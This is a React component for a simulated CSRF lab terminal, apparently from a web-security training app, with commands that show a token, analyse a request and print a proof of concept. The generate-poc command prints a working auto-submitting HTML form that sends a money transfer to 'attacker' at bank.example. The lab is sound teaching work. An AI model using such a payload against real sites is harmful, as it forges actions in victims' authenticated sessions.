import React, { useState } from 'react';
import { Terminal as TerminalIcon, Play, Trash } from 'lucide-react';

interface CSRFLabTerminalProps {
  state: {
    currentRequest: any;
    lastAttempt: any;
    csrfToken: string;
    sessionCookie: string;
  };
  setState: (state: any) => void;
}

export function CSRFLabTerminal({ state, setState }: CSRFLabTerminalProps) {
  const [commands, setCommands] = useState<string[]>([]);
  const [currentCommand, setCurrentCommand] = useState('');

  const executeCommand = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentCommand.trim()) return;

    const command = currentCommand.trim();
    setCommands([...commands, `$ ${command}`]);

    // Process CSRF-related commands
    if (command === 'csrf generate-poc') {
      const pocHtml = `
<html>
  <body>
    <form id="csrf-form" action="http://bank.example/transfer" method="POST">
      <input type="hidden" name="amount" value="1000">
      <input type="hidden" name="recipient" value="attacker">
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
  </body>
</html>`;
      setCommands(prev => [...prev, 'Generating CSRF PoC:', pocHtml]);
    } else if (command.startsWith('csrf token')) {
      setCommands(prev => [...prev, 
        'Current CSRF Token:',
        state.csrfToken || 'No token available'
      ]);
    } else if (command === 'help') {
      setCommands(prev => [...prev, 
        'Available commands:',
        '  csrf generate-poc   - Generate CSRF proof of concept',
        '  csrf token          - Show current CSRF token',
        '  csrf analyze        - Analyze current request',
        '  clear              - Clear terminal',
        '  help               - Show this help message'
      ]);
    } else if (command === 'clear') {
      setCommands([]);
    } else if (command === 'csrf analyze') {
      if (state.currentRequest) {
        setCommands(prev => [...prev,
          'Analyzing current request:',
          JSON.stringify(state.currentRequest, null, 2),
          '',
          'Security Analysis:',
          '- Token Validation: ' + (state.csrfToken ? 'Present' : 'Missing'),
          '- Session Cookie: ' + (state.sessionCookie ? 'Present' : 'Missing'),
          '- SameSite Policy: Not Enforced'
        ]);
      } else {
        setCommands(prev => [...prev, 'No request available for analysis']);
      }
    } else {
      setCommands(prev => [...prev, 'Command not found. Type "help" for available commands']);
    }

    setCurrentCommand('');
  };

  return (
    <div className="bg-gray-950 rounded-lg p-4 font-mono text-sm">
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-2">
          <TerminalIcon className="w-4 h-4 text-green-400" />
          <span className="text-green-400">CSRF Testing Terminal</span>
        </div>
        <button
          onClick={() => setCommands([])}
          className="text-gray-500 hover:text-gray-400"
        >
          <Trash className="w-4 h-4" />
        </button>
      </div>

      <div className="h-80 overflow-y-auto mb-4 space-y-1">
        {commands.map((cmd, i) => (
          <div key={i} className="text-gray-300 whitespace-pre-wrap">{cmd}</div>
        ))}
      </div>

      <form onSubmit={executeCommand} className="flex gap-2">
        <span className="text-green-400">$</span>
        <input
          type="text"
          value={currentCommand}
          onChange={(e) => setCurrentCommand(e.target.value)}
          className="flex-1 bg-transparent focus:outline-none text-gray-300"
          placeholder="Type 'help' for available commands..."
        />
        <button type="submit" className="text-green-400">
          <Play className="w-4 h-4" />
        </button>
      </form>
    </div>
  );
}